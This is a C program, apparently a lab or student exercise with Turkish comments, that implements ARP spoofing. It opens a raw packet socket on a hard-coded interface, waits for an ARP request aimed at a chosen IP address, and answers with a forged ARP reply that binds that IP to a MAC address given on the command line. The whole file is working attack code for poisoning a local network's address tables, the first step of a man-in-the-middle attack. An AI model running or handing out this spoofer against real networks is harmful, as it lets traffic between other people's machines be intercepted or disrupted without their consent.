#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <errno.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <netpacket/packet.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <ifaddrs.h>

#define ETH_HDR_LEN 14
#define ARP_PKT_LEN 28
#define ARP_REQUEST 1
#define ARP_REPLY 2
#define ETH_P_ARP 0x0806
#define HW_TYPE_ETH 0x0001
#define PROTO_TYPE_IP 0x0800

static int running = 1;

void signal_handler(int sig) {
    (void)sig;
    running = 0;
}

struct arp_header {
    uint16_t hw_type;
    uint16_t proto_type;
    uint8_t hw_size;
    uint8_t proto_size;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
};

void mac_str_to_bytes(const char *str, uint8_t *mac) {
    sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: sudo %s <source_ip> <source_mac> <target_ip> <target_mac>\n", argv[0]);
        return EXIT_FAILURE;
    }

    signal(SIGINT, signal_handler);

    char *source_ip = argv[1];
    char *source_mac_str = argv[2];
    char *target_ip = argv[3];
    char *target_mac_str = argv[4];

    uint8_t source_mac[6], target_mac[6];
    mac_str_to_bytes(source_mac_str, source_mac);
    mac_str_to_bytes(target_mac_str, target_mac);

    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("socket");
        return EXIT_FAILURE;
    }

    // Manuel olarak enp0s3 arayüzünü kullanacağız
    char ifname[] = "enp0s3";  // Arayüz ismini burada doğrudan belirtiyoruz.

    printf("Listening on interface: %s\n", ifname);

    struct sockaddr_ll device = {0};
    device.sll_ifindex = if_nametoindex(ifname);
    if (device.sll_ifindex == 0) {
        fprintf(stderr, "Arayüz bulunamadı: %s\n", ifname);
        close(sock);
        return EXIT_FAILURE;
    }
    device.sll_family = AF_PACKET;
    memcpy(device.sll_addr, target_mac, 6);
    device.sll_halen = 6;

    while (running) {
        uint8_t buffer[ETH_HDR_LEN + ARP_PKT_LEN];
        ssize_t len = recv(sock, buffer, sizeof(buffer), 0);
        if (len < 0) continue;

        struct ether_header *eth = (struct ether_header *)buffer;
        if (ntohs(eth->ether_type) != ETH_P_ARP) continue;

        struct arp_header *arp = (struct arp_header *)(buffer + ETH_HDR_LEN);
        if (ntohs(arp->opcode) != ARP_REQUEST) continue;

        in_addr_t src_ip = inet_addr(source_ip);
        if (memcmp(arp->target_ip, &src_ip, 4) != 0) continue;

        printf("Received ARP request from %d.%d.%d.%d\n",
               arp->sender_ip[0], arp->sender_ip[1], arp->sender_ip[2], arp->sender_ip[3]);

        // Construct ARP reply
        uint8_t packet[ETH_HDR_LEN + ARP_PKT_LEN] = {0};
        struct ether_header *eth_hdr = (struct ether_header *)packet;
        struct arp_header *arp_hdr = (struct arp_header *)(packet + ETH_HDR_LEN);

        memcpy(eth_hdr->ether_dhost, target_mac, 6);
        memcpy(eth_hdr->ether_shost, source_mac, 6);
        eth_hdr->ether_type = htons(ETH_P_ARP);

        arp_hdr->hw_type = htons(HW_TYPE_ETH);
        arp_hdr->proto_type = htons(PROTO_TYPE_IP);
        arp_hdr->hw_size = 6;
        arp_hdr->proto_size = 4;
        arp_hdr->opcode = htons(ARP_REPLY);
        memcpy(arp_hdr->sender_mac, source_mac, 6);
        inet_pton(AF_INET, source_ip, arp_hdr->sender_ip);
        memcpy(arp_hdr->target_mac, target_mac, 6);
        inet_pton(AF_INET, target_ip, arp_hdr->target_ip);

        printf("Sending spoofed ARP reply...\n");
        if (sendto(sock, packet, sizeof(packet), 0,
                   (struct sockaddr *)&device, sizeof(device)) < 0) {
            perror("sendto");
        } else {
            printf("Spoofed ARP reply sent to %s\n", target_ip);
        }

        break;
    }

    close(sock);
    return EXIT_SUCCESS;
}
